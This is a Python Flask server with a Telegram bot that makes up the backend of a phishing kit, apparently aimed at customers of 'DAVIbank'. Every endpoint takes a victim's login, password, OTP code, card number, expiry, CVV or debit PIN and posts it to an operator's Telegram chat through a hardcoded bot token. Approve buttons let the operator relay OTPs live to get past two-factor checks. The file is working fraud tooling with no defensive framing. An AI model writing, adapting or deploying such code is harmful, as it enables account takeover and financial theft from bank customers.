from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
import threading
import time

BOT_TOKEN = '8144392743:AAF0qG5TnvlhYcGZdlz7f3rwLpMBw3rXvqQ'
ADMIN_CHAT_ID = '6434195233'
PORT = 3000

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Store user data
user_data = {}  # userId -> {username, password, otp, login_validated, otp_validated}
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0

# ============ API ENDPOINTS ============

@app.route('/api/submit-login', methods=['POST', 'OPTIONS'])
def submit_login():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    
    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
    
    user_data[user_id] = {
        'username': username,
        'password': password,
        'login_validated': False,
        'otp_validated': False,
        'timestamp': datetime.now().isoformat()
    }
    
    # Create inline keyboard button for LOGIN validation
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ VALIDAR LOGIN", "callback_data": f"validate_login_{user_id}"}
        ]]
    }
    
    message = (f"🔐 **NUEVO LOGIN** 🔐\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"👤 Usuario: {username}\n"
               f"🔑 Contraseña: {password}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ Presione VALIDAR LOGIN para que el usuario ingrese el OTP")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST', 'OPTIONS'])
def submit_otp():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    user_otp = data.get('otp')
    
    print(f"[{datetime.now()}] 🔢 OTP submitted: {user_id} - {user_otp}")
    
    if user_id in user_data:
        user_data[user_id]['otp'] = user_otp
        
        # Create inline keyboard button for OTP validation
        keyboard = {
            "inline_keyboard": [[
                {"text": "✅ VALIDAR OTP", "callback_data": f"validate_otp_{user_id}"}
            ]]
        }
        
        message = (f"🔢 **CÓDIGO OTP RECIBIDO** 🔢\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n"
                   f"🆔 ID: `{user_id}`\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"👤 Usuario: {user_data[user_id]['username']}\n"
                   f"🔢 Código OTP: `{user_otp}`\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"⚠️ Presione VALIDAR OTP para que el usuario continúe a la página de tarjeta")
        
        requests.post(f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/check-login/<user_id>', methods=['GET', 'OPTIONS'])
def check_login(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in user_data:
        return jsonify({"validated": user_data[user_id].get('login_validated', False)})
    return jsonify({"validated": False})

@app.route('/api/check-otp/<user_id>', methods=['GET', 'OPTIONS'])
def check_otp(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in user_data:
        return jsonify({"validated": user_data[user_id].get('otp_validated', False)})
    return jsonify({"validated": False})

@app.route('/api/card', methods=['POST', 'OPTIONS'])
def submit_card():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    message = (f"💳 **DATOS DE TARJETA** 💳\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"👤 Usuario: {data.get('username')}\n"
               f"🔑 Contraseña: {data.get('password')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"💳 Tarjeta: {data.get('cardNumber')}\n"
               f"📅 Expira: {data.get('expiry')}\n"
               f"🔐 CVV: {data.get('cvv')}\n"
               f"🏧 PIN: {data.get('debitPin')}")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message})
    
    return jsonify({"success": True})

@app.route('/health', methods=['GET', 'OPTIONS'])
def health():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    return jsonify({"status": "ok", "users": len(user_data)})

# ============ TELEGRAM POLLING ============

def poll_telegram():
    global last_update_id
    while True:
        try:
            url = f"{TELEGRAM_API}/getUpdates"
            params = {"timeout": 30}
            if last_update_id:
                params["offset"] = last_update_id + 1
            
            response = requests.get(url, params=params, timeout=35)
            updates = response.json()
            
            if updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id']
                    
                    if 'callback_query' in update:
                        callback = update['callback_query']
                        data = callback['data']
                        
                        if data.startswith('validate_login_'):
                            user_id = data.replace('validate_login_', '')
                            if user_id in user_data:
                                user_data[user_id]['login_validated'] = True
                                print(f"[{datetime.now()}] ✅ Login validated: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ Login validado! El usuario puede ingresar OTP"})
                        
                        elif data.startswith('validate_otp_'):
                            user_id = data.replace('validate_otp_', '')
                            if user_id in user_data:
                                user_data[user_id]['otp_validated'] = True
                                print(f"[{datetime.now()}] ✅ OTP validated: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ OTP validado! El usuario verá la página de tarjeta"})
                    
                    if 'message' in update:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message.get('text', '')
                        
                        if text == '/start':
                            welcome = ("🤖 Bot de validación DAVIbank\n\n"
                                      "Flujo:\n"
                                      "1. Recibe login → presiona VALIDAR LOGIN\n"
                                      "2. Recibe OTP → presiona VALIDAR OTP\n"
                                      "3. Recibe datos de tarjeta\n\n"
                                      "Comandos:\n/status - Ver estado")
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": welcome})
                        
                        elif text == '/status':
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": f"📊 Usuarios activos: {len(user_data)}"})
        
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("DAVIbank Bot Starting...")
    print("="*50)
    
    poll_thread = threading.Thread(target=poll_telegram, daemon=True)
    poll_thread.start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
